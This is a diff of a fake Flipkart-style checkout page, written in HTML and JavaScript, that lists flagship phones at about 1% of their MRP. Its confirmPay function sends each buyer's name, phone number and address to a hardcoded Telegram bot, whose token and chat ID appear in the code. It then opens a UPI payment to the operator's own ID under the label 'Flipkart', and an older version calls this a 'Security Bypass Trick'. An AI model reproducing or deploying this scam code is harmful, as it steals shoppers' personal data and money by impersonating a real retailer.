@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -295,71 +294,54 @@
 </div>
 
     <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
-    <nav class="fk-blue p-4 text-white flex items-center gap-4">
-        <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
-        <span class="font-medium">Payments</span>
-    </nav>
-    
-    <div class="p-3">
-        <p class="text-sm font-bold text-gray-500 mb-2 uppercase">All Payment Options</p>
-        
-        <div class="bg-white rounded-sm shadow-sm divide-y">
-            <label class="flex items-center p-4 cursor-pointer" onclick="confirmPay()">
-                <input type="radio" name="payMethod" checked class="w-5 h-5">
-                <div class="ml-4">
-                    <p class="font-medium text-gray-800">UPI (PhonePe / GPay / Paytm)</p>
-                    <p class="text-[10px] text-green-600 font-bold">Pay directly using any UPI app</p>
-                </div>
-                <img src="https://img.icons8.com/color/48/upi.png" class="w-8 ml-auto">
-            </label>
-
-            <label class="flex items-center p-4 cursor-pointer" onclick="showQRCode()">
-                <input type="radio" name="payMethod" class="w-5 h-5">
-                <div class="ml-4">
-                    <p class="font-medium text-gray-800">Show QR Code (Most Secure)</p>
-                    <p class="text-[10px] text-blue-600 font-bold">Scan from another phone to pay</p>
-                </div>
-                <i class="fa-solid fa-qrcode text-2xl ml-auto text-gray-700"></i>
-            </label>
-            
-            <label class="flex items-center p-4 opacity-60">
-                <input type="radio" disabled class="w-5 h-5">
-                <div class="ml-4">
-                    <p class="font-medium text-gray-800">Credit / Debit Card</p>
-                </div>
-            </label>
+        <nav class="fk-blue p-4 text-white flex items-center gap-4">
+            <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
+            <span class="font-medium">Payments</span>
+        </nav>
+      <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium text-gray-500">
+    <div class="flex flex-col items-center gap-1 text-blue-600">
+        <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white">1</div>
+        <span>Address</span>
+    </div>
+    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
+    <div class="flex flex-col items-center gap-1">
+        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">2</div>
+        <span>Order Summary</span>
+    </div>
+    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
+    <div class="flex flex-col items-center gap-1">
+        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">3</div>
+        <span>Payment</span>
+    </div>
+</div>
+        <div class="p-4">
+            <div class="bg-white p-4 rounded shadow-sm">
+                <label class="flex items-center justify-between">
+                    <div class="flex gap-4 items-center">
+                        <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
+                        <span class="font-bold">UPI (PhonePe / GPay)</span>
+                    </div>
+                    <input type="radio" checked>
+                </label>
+            </div>
+            <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
         </div>
     </div>
 
-    <div class="fixed bottom-0 w-full p-2 bg-white border-t">
-        <button onclick="confirmPay()" class="w-full btn-orange py-4 shadow-xl uppercase font-bold">Place Order</button>
-    </div>
-</div>
-
-<div id="qr-modal" class="hidden fixed inset-0 bg-black/80 z-[500] flex items-center justify-center p-6">
-    <div class="bg-white p-6 rounded-lg text-center w-full max-w-xs">
-        <p class="font-bold mb-4 text-black">Scan & Pay with any App</p>
-        
-        <div id="qrcode" class="mb-4 flex justify-center p-2 border-2 border-dashed bg-white"></div>
-        
-        <p class="text-xs text-gray-500 mb-4">Total Amount: <span id="qr-amt" class="font-bold text-black text-lg"></span></p>
-        <button onclick="closeQR()" class="w-full bg-gray-200 py-2 rounded font-bold text-black">Close</button>
-    </div>
-</div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script>
         const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
         const CHAT_ID = "1981500395";
-        const MY_UPI = "8709615634-w350@ybl";
+        const MY_UPI = "john.sa@ptyes";
 
         // यहाँ descImgs: [] में आप लंबी बैनर फोटो डाल सकते हैं
         const products = [
-            { id: 208, name: "Apple iPhone 17 Pro Max (Silver, 256 GB)", price: "1400",mrp: "149900", imgs: ["https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/0/p/g/-original-imahft6cfwg6yta2.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/q/r/1/-original-imahft6cqn3ftf4p.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/3/y/r/-original-imahft6cq9fpa2ch.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/a/c/5/-original-imahft6cj2bzyfbq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/z/v/8/-original-imahft6cjegrw5sj.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/c/i/p/-original-imahft6chqfe38fp.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/n/a/n/-original-imahft5nq7z4bnmn.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/l/z/q/-original-imahft57f3qjg325.jpeg?q=90"],
+            { id: 208, name: "Apple iPhone 17 Pro Max (Silver, 256 GB)", price: "1499",mrp: "149900", imgs: ["https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/0/p/g/-original-imahft6cfwg6yta2.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/q/r/1/-original-imahft6cqn3ftf4p.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/3/y/r/-original-imahft6cq9fpa2ch.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/a/c/5/-original-imahft6cj2bzyfbq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/z/v/8/-original-imahft6cjegrw5sj.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/c/i/p/-original-imahft6chqfe38fp.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/n/a/n/-original-imahft5nq7z4bnmn.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/l/z/q/-original-imahft57f3qjg325.jpeg?q=90"],
             descImgs:["https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/0/p/g/-original-imahft6cfwg6yta2.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/q/r/1/-original-imahft6cqn3ftf4p.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/3/y/r/-original-imahft6cq9fpa2ch.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/a/c/5/-original-imahft6cj2bzyfbq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/z/v/8/-original-imahft6cjegrw5sj.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/c/i/p/-original-imahft6chqfe38fp.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/n/a/n/-original-imahft5nq7z4bnmn.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/l/z/q/-original-imahft57f3qjg325.jpeg?q=90","https://i.ibb.co/yFc2z40L/Screenshot-2026-0203-152622.jpg","https://i.ibb.co/4w4DxL0x/Screenshot-2026-0203-152643.jpg","https://i.ibb.co/KzKy4hZm/Screenshot-2026-0203-152705.jpg"]},
             { id: 39, name: "Samsung Galaxy S25 Ultra 5G (Titanium Silverblue, 512 GB) (12 GB RAM)", price: "1499",mrp: "149900", imgs: ["https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/i/s/g/-original-imahgfmzraymrnrg.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/q/q/e/-original-imahjsufxrjrxmgz.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/f/j/t/-original-imahggetqzszzxqh.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/b/f/h/-original-imahggetvab85sng.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/e/q/g/-original-imahgget2pqvf8gq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/v/q/h/-original-imahggethhfzdn9n.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/9/2/z/-original-imahggetuergm7sg.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/e/2/t/-original-imahgget9yud6zh5.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/w/c/d/-original-imahggeth5jngcva.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/w/7/q/-original-imahggetnje6tbpe.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/f/o/n/-original-imahggetmwxngznw.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/a/g/z/-original-imahgget3agkpmpu.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/f/r/m/-original-imahggetzegsudpx.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/l/g/k/-original-imahgget9d7vkqxt.jpeg?q=90"],
              descImgs:["https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/i/s/g/-original-imahgfmzraymrnrg.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/q/q/e/-original-imahjsufxrjrxmgz.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/f/j/t/-original-imahggetqzszzxqh.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/b/f/h/-original-imahggetvab85sng.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/e/q/g/-original-imahgget2pqvf8gq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/v/q/h/-original-imahggethhfzdn9n.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/9/2/z/-original-imahggetuergm7sg.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/e/2/t/-original-imahgget9yud6zh5.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/w/c/d/-original-imahggeth5jngcva.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/w/7/q/-original-imahggetnje6tbpe.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/f/o/n/-original-imahggetmwxngznw.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/a/g/z/-original-imahgget3agkpmpu.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/f/r/m/-original-imahggetzegsudpx.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/mobile/l/g/k/-original-imahgget9d7vkqxt.jpeg?q=90","https://i.ibb.co/Zz1521SC/Screenshot-2026-0203-153732.jpg","https://i.ibb.co/svq9Q0Pv/Screenshot-2026-0203-153752.jpg","https://i.ibb.co/PGJPvt3b/Screenshot-2026-0203-153822.jpg"] },
         
-            { id: 39, name: "vivo V50 5G (Rose Red, 128 GB) (8 GB RAM)", price: "600",mrp: "31449", imgs: ["https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/v/z/r/-original-imahc6hdfzgzczzj.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/l/9/x/-original-imahc6hdb5ux8zax.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/9/p/p/-original-imahc6hdyfeb9wns.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/x/s/i/-original-imahc6hdcetgzzgx.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/x/y/i/-original-imahc6hdjfgzq2yx.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/w/f/l/-original-imahc6hdqgy8uwxb.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/f/w/c/-original-imahc6hdjffnmqjq.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/c/z/p/-original-imahc6hdm9brymhp.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/1/x/y/-original-imahc6hdezzgtthh.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/r/2/x/-original-imahc6hdb3rkcej6.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/e/r/o/-original-imahc6hdfyfjnhty.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/n/y/0/-original-imahc6hds7gfh7f7.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/c/w/8/-original-imahc6hdzdppwjyr.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/5/f/z/-original-imahc6hdwyhhprzr.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/o/m/k/-original-imahc6hdecvmgz5t.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/9/i/c/-original-imahc6hd7eggptdp.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/n/q/l/-original-imahc6hdfve2tpbu.jpeg?q=90"],
+            { id: 39, name: "vivo V50 5G (Rose Red, 128 GB) (8 GB RAM)", price: "645",mrp: "31449", imgs: ["https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/v/z/r/-original-imahc6hdfzgzczzj.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/l/9/x/-original-imahc6hdb5ux8zax.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/9/p/p/-original-imahc6hdyfeb9wns.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/x/s/i/-original-imahc6hdcetgzzgx.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/x/y/i/-original-imahc6hdjfgzq2yx.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/w/f/l/-original-imahc6hdqgy8uwxb.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/f/w/c/-original-imahc6hdjffnmqjq.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/c/z/p/-original-imahc6hdm9brymhp.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/1/x/y/-original-imahc6hdezzgtthh.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/r/2/x/-original-imahc6hdb3rkcej6.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/e/r/o/-original-imahc6hdfyfjnhty.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/n/y/0/-original-imahc6hds7gfh7f7.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/c/w/8/-original-imahc6hdzdppwjyr.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/5/f/z/-original-imahc6hdwyhhprzr.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/o/m/k/-original-imahc6hdecvmgz5t.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/9/i/c/-original-imahc6hd7eggptdp.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/n/q/l/-original-imahc6hdfve2tpbu.jpeg?q=90"],
            descImgs: ["https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/v/z/r/-original-imahc6hdfzgzczzj.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/l/9/x/-original-imahc6hdb5ux8zax.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/9/p/p/-original-imahc6hdyfeb9wns.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/x/s/i/-original-imahc6hdcetgzzgx.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/x/y/i/-original-imahc6hdjfgzq2yx.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/w/f/l/-original-imahc6hdqgy8uwxb.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/f/w/c/-original-imahc6hdjffnmqjq.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/c/z/p/-original-imahc6hdm9brymhp.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/1/x/y/-original-imahc6hdezzgtthh.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/r/2/x/-original-imahc6hdb3rkcej6.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/e/r/o/-original-imahc6hdfyfjnhty.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/n/y/0/-original-imahc6hds7gfh7f7.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/c/w/8/-original-imahc6hdzdppwjyr.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/5/f/z/-original-imahc6hdwyhhprzr.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/o/m/k/-original-imahc6hdecvmgz5t.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/9/i/c/-original-imahc6hd7eggptdp.jpeg?q=90","https://rukminim2.flixcart.com/image/2560/2560/xif0q/mobile/n/q/l/-original-imahc6hdfve2tpbu.jpeg?q=90","https://i.ibb.co/Wp282Nvq/IMG-20260130-192226.jpg","https://i.ibb.co/ymWWHsTP/IMG-20260130-192257.jpg","https://i.ibb.co/kWJ1ZpM/IMG-20260130-192331.jpg" 
                                                                                         
                 ]
@@ -559,74 +541,40 @@ init = function() {
             }
         }
 
-        // QR Code dikhane ke liye function
-function showQRCode() {
-    const amt = sel.price;
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Order%20Payment&am=${amt}&cu=INR`;
-    
-    // Google API se QR generate karna
-    const qrUrl = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(upiLink)}`;
-    
-    document.getElementById('qr-img').src = qrUrl;
-    document.getElementById('qr-amt').innerText = "₹" + amt;
-    document.getElementById('qr-modal').classList.remove('hidden');
-}
+        async function confirmPay() {
+            // Sari details collect karna
+            const name = document.getElementById('uName').value;
+            const phone = document.getElementById('uPhone').value;
+            const pincode = document.getElementById('uPin').value;
+            const city = document.getElementById('uCity').value;
+            const address = document.getElementById('uAdd').value;
 
-function closeQR() {
-    document.getElementById('qr-modal').classList.add('hidden');
-}
+            // Message format (thoda sundar banaya hai)
+            const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
+                        `📦 *Item:* ${sel.name}\n` +
+                        `💰 *Price:* ₹${sel.price}\n\n` +
+                        `👤 *Name:* ${name}\n` +
+                        `📞 *Phone:* ${phone}\n` +
+                        `📍 *Pin:* ${pincode}\n` +
+                        `🏙️ *City:* ${city}\n` +
+                        `🏠 *Add:* ${address}`;
 
-function showQRCode() {
-    const amt = sel.price;
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Order%20Payment&am=${amt}&cu=INR&tn=Order_${Date.now()}`;
-    
-    // Purana QR clear karne ke liye
-    document.getElementById("qrcode").innerHTML = "";
-    document.getElementById('qr-amt').innerText = "₹" + amt;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-    // Naya QR Code draw karne ke liye
-    new QRCode(document.getElementById("qrcode"), {
-        text: upiLink,
-        width: 180,
-        height: 180,
-        colorDark : "#000000",
-        colorLight : "#ffffff",
-        correctLevel : QRCode.CorrectLevel.M
-    });
-    
-    document.getElementById('qr-modal').classList.remove('hidden');
-}
+            try {
+                // Pehle message bhejne ka intezaar karega
+                await fetch(url);
+                console.log("Telegram notification sent!");
+            } catch (e) {
+                console.log("Telegram failed but moving to payment");
+            }
 
-// 2. Modal band karne ka function
-function closeQR() {
-    document.getElementById('qr-modal').classList.add('hidden');
-}
+            // Ab Payment par le jayega
+            window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR`;
+        }
 
-// 3. Confirm Pay Function (Security Update ke saath)
-async function confirmPay() {
-    const name = document.getElementById('uName').value;
-    const phone = document.getElementById('uPhone').value;
-    const pincode = document.getElementById('uPin').value;
-    const city = document.getElementById('uCity').value;
-    const address = document.getElementById('uAdd').value;
-
-    const msg = `🔥 *NEW ORDER* 🔥\n📦 *Item:* ${sel.name}\n💰 *Price:* ₹${sel.price}\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}\n📍 *Pin:* ${pincode}\n🏙️ *City:* ${city}\n🏠 *Add:* ${address}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-
-    try { await fetch(url); } catch (e) { console.log("TG Error"); }
-
-    // Direct Intent (Security Bypass Trick)
-    const upiIntent = `upi://pay?pa=${MY_UPI}&pn=Secure%20Payment&am=${sel.price}&cu=INR&tn=Ref_${Math.floor(Math.random()*10000)}`;
-    
-    const a = document.createElement('a');
-    a.href = upiIntent;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-}
-
-// Ye line hamesha last mein rehni chahiye
-init();
+        // Ye line hamesha last mein rehni chahiye
+        init();
     </script>
 </body>
 </html> 
